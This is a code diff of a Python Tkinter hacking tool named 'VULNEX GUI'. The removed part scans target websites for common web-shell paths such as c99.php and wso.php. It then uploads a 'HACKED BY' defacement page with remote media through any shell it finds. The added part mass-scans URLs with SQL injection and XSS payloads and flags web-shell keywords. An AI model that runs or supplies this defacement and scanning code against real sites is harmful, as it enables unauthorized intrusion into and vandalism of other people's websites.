@@ -1,66 +1,91 @@
-import requests, threading, os
-from tkinter import *
-from tkinter import filedialog, messagebox
-from tkinter.ttk import Combobox
-from urllib.parse import urljoin
+import tkinter as tk
+from tkinter import filedialog, messagebox, scrolledtext
+import threading
+import requests
+import re
+import os
 
-# GUI Setup
-root = Tk()
-root.title("🔥 VULNEX GUI: FINAL EDITION")
-root.geometry("700x600")
-root.configure(bg="#1e1e1e")
-
-logo = PhotoImage(file="logo.png")  # Pastikan logo tersedia dengan nama ini
-Label(root, image=logo, bg="#1e1e1e").pack()
-Label(root, text="VULNEX GUI: FINAL EDITION", font=("Helvetica", 18, "bold"), fg="cyan", bg="#1e1e1e").pack()
-
-url_entry = Entry(root, width=80)
-url_entry.pack(pady=10)
-
-results_box = Text(root, height=20, width=90, bg="black", fg="lime")
-results_box.pack()
-
-# Shell path patterns
-shell_paths = [
-    "shell.php", "up.php", "cmd.php", "sh.php", "upload.php", "backdoor.php",
-    "adminer.php", "pwn.php", "bypass.php", "c99.php", "wso.php", "r57.php"
-]
-
-# Auto Deface Content
-deface_html = '''<html><head><title>HACKED BY R4JXPL0IT</title></head>
-<body bgcolor=black><center><img src='https://k.top4top.io/p_3383hpowi1.png' width=300><br>
-<font color=white size=5>R4JCPLOIT TERLALU GANTENG BUAT PACARNYA</font>
-<br><audio autoplay loop><source src='https://k.top4top.io/m_3384dki6b1.mp3' type='audio/mpeg'></audio>
-</center><script src='https://cdn.prinsh.com/NathanPrinsley-effect/salju-terbang.js'></script></body></html>'''
-
-def check_shell_upload(base_url):
-    results_box.insert(END, f"[+] Checking shell upload path on {base_url}\n")
-    for path in shell_paths:
-        full_url = urljoin(base_url, path)
+# --- Basic Vulnerability Scanner ---
+def sqli_scanner(url):
+    payloads = ["'", "\"", "'--", "\"--", "' OR '1'='1", "\" OR \"1\"=\"1"]
+    found = False
+    for payload in payloads:
         try:
-            r = requests.get(full_url, timeout=5)
-            if "shell" in r.text or "WSO" in r.text or "cmd" in r.text:
-                results_box.insert(END, f"[!] Shell Detected: {full_url}\n")
-                with open("found_shells.txt", "a") as f:
-                    f.write(full_url + "\n")
-                return full_url
-        except:
+            r = requests.get(url + payload, timeout=5)
+            if re.search("SQL syntax|sql error|mysql_fetch|mysqli|syntax error", r.text, re.I):
+                log_result(f"[SQLi] Vulnerable: {url + payload}")
+                found = True
+                break
+        except Exception as e:
             continue
-    results_box.insert(END, "[-] No shell found.\n")
-    return None
+    if not found:
+        log_result(f"[SQLi] Not vulnerable: {url}")
 
-def auto_deface(base_url):
-    shell_url = check_shell_upload(base_url)
-    if shell_url:
-        try:
-            upload = requests.post(shell_url, files={'file': ('index.html', deface_html)}, timeout=10)
-            results_box.insert(END, f"[+] Auto Deface Attempted: {shell_url}\n")
-        except:
-            results_box.insert(END, f"[!] Failed deface at {shell_url}\n")
-    else:
-        results_box.insert(END, "[-] Cannot deface, no shell found.\n")
+def xss_scanner(url):
+    payload = "<script>alert(1)</script>"
+    try:
+        r = requests.get(url + payload, timeout=5)
+        if payload in r.text:
+            log_result(f"[XSS] Vulnerable: {url + payload}")
+        else:
+            log_result(f"[XSS] Not vulnerable: {url}")
+    except:
+        pass
 
-# Trigger
-Button(root, text="Scan Shell + Auto Deface", bg="red", fg="white", command=lambda: threading.Thread(target=auto_deface, args=(url_entry.get(),)).start()).pack(pady=10)
+def shell_upload_checker(url):
+    keywords = ["shell", "cmd", "wso", "b374k", "upl0ad"]
+    try:
+        r = requests.get(url, timeout=5)
+        for key in keywords:
+            if key in r.text.lower():
+                log_result(f"[Shell] Possible shell found: {url}")
+                return
+        log_result(f"[Shell] Not detected: {url}")
+    except:
+        pass
 
-root.mainloop()
+# --- Thread wrapper ---
+def scan_thread(url, vuln_type):
+    if vuln_type == "SQLi":
+        sqli_scanner(url)
+    elif vuln_type == "XSS":
+        xss_scanner(url)
+    elif vuln_type == "Shell":
+        shell_upload_checker(url)
+
+# --- GUI Functions ---
+def start_scan():
+    urls = input_box.get("1.0", tk.END).strip().split("\n")
+    vuln_type = vuln_type_var.get()
+    for url in urls:
+        if url:
+            threading.Thread(target=scan_thread, args=(url.strip(), vuln_type)).start()
+
+def log_result(text):
+    output_box.insert(tk.END, text + "\n")
+    output_box.see(tk.END)
+    with open("scan_results.txt", "a") as f:
+        f.write(text + "\n")
+
+# --- GUI ---
+app = tk.Tk()
+app.title("VULNEX GUI Edition")
+app.geometry("650x500")
+
+frame_top = tk.Frame(app)
+frame_top.pack(pady=10)
+
+vuln_type_var = tk.StringVar(value="SQLi")
+vuln_menu = tk.OptionMenu(frame_top, vuln_type_var, "SQLi", "XSS", "Shell")
+vuln_menu.pack(side=tk.LEFT, padx=5)
+
+scan_btn = tk.Button(frame_top, text="Start Scan", command=start_scan)
+scan_btn.pack(side=tk.LEFT, padx=5)
+
+input_box = scrolledtext.ScrolledText(app, height=10)
+input_box.pack(fill=tk.BOTH, padx=10, pady=5)
+
+output_box = scrolledtext.ScrolledText(app, height=15)
+output_box.pack(fill=tk.BOTH, padx=10, pady=5)
+
+app.mainloop()
